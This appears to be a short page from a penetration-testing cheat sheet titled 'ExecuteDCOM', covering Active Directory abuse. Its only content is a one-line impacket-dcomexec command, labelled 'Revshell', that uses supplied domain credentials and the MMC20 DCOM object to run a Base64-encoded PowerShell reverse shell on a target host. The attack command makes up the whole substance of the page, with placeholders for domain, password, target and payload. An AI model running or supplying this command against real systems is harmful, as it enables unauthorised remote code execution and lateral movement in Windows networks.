---
title: "ExecuteDCOM"
date: 2024-8-3
tags: ["ExecuteDCOM", "active driectory", "ad", "Windows", "dcsync", "secretsdump"]
---

---
### Abuse #1: ExecuteDCOM

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```bash
# Revshell
impacket-dcomexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET> '<powershell #3 Base64>' -silentcommand -object MMC20
```

</div>

{{< /tabcontent >}}

<br>